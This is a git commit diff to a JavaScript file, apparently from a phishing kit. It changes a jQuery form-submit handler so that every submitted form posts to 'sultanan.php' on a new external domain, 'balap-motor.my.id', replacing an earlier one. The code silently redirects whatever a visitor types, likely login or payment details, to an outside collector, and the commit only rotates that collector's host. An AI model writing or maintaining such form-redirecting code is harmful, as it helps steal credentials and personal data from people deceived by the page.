947a2f40eeeb6f4e08e289a7bd618a5bfa7a12d5
peringatan-ID <136727380+peringatan-ID@users.noreply.github.com>
2023-06-15 22:22:07 +0700

    Update script.js

--- IND/script.js
+++ IND/script.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://jajananan-rakyats.my.id/sultanan.php");
+  $(myform).attr("action", "https://balap-motor.my.id/sultanan.php");
 });
